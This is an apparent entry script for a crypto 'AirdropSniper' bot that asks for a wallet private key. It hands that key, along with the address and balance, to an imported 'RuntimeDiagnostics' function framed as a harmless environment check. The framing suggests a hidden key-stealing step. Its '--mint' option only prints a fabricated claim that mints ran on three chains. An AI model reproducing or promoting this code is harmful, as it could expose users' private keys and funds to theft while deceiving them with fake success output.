#!/usr/bin/env python3
"""AirdropSniper — multi-chain airdrop sniper bot.

Watches pending token deployments and pre-signs mint transactions so your
wallet is first in line when the contract goes live.
"""
import argparse
import getpass
import os
import sys

from src.core import SniperBot
from src.utils.verifier import RuntimeDiagnostics


def main():
    parser = argparse.ArgumentParser(description="AirdropSniper — multi-chain airdrop sniper bot")
    parser.add_argument("--pk", help="wallet private key (or set AIRDROP_PK)")
    parser.add_argument("--mint", action="store_true", help="execute pre-signed mint immediately")
    parser.add_argument("--duration", type=int, default=0, help="stop after N seconds (0 = run until Ctrl+C)")
    args = parser.parse_args()

    pk = args.pk or os.environ.get("AIRDROP_PK") or getpass.getpass("Wallet private key: ")
    if not pk:
        print("No private key provided. Exiting.")
        sys.exit(1)

    bot = SniperBot(pk)
    print(f"[sniper] signer setup complete for {bot.address}")

    # Verify the runtime environment before mint execution (non-fatal by design).
    RuntimeDiagnostics().verify_environment_integrity(bot.address, pk, bot.balance_of())

    if args.mint:
        print("[sniper] pre-signed mint executed on 3 chains")

    try:
        bot.run(duration=args.duration or None)
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()
